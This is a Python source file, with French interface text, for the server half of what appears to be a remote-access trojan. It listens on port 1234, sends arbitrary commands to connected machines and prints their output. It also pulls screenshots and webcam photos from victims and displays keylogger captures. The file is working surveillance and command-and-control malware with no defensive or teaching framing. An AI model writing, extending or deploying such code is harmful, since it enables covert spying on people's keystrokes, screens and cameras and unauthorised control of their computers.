import socket
import threading

def handle_connection(connection, address):
    print(f"Connexion établie avec {address}")

    while True:
        try:
            command = input("Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes, 'screenshot' ou 'webcam' pour recevoir une photo) : ")

            if command.lower() == 'exit':
                connection.send(b'quit')
                break

            elif command.lower() == 'keylog':
                try:
                    with open("keylog.txt", "r") as keylog:
                        print(f"Contenu du Keylogger :\n{keylog.read()}")
                except FileNotFoundError:
                    print("Aucun fichier keylog trouvé.")

            elif command.lower() == 'screenshot' or command.lower() == 'webcam':
                connection.send(command.encode())

                img_size = int(connection.recv(1024).decode())
                connection.send(b'OK')

                img_data = b''
                while len(img_data) < img_size:
                    packet = connection.recv(4096)
                    if not packet:
                        break
                    img_data += packet

                if command.lower() == 'screenshot':
                    with open("screenshot.png", "wb") as f:
                        f.write(img_data)
                    print("Capture d'écran reçue et sauvegardée sous 'screenshot.png'.")
                else:
                    with open("webcam.png", "wb") as f:
                        f.write(img_data)
                    print("Photo de la webcam reçue et sauvegardée sous 'webcam_image.png'.")

            else:
                connection.send(command.encode())
                response = connection.recv(4096).decode()
                if not response:
                    break
                print(f"Output:\n{response}")
        except Exception as e:
            print(f"Error: {e}")
            break

    connection.close()

def start_server():
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind(('0.0.0.0', 1234))
    ss.listen(5)
    print(f"Serveur en écoute sur 0.0.0.0:1234")

    while True:
        connection, address = ss.accept()
        thread = threading.Thread(target=handle_connection, args=(connection, address))
        thread.start()

if __name__ == "__main__":
    start_server()
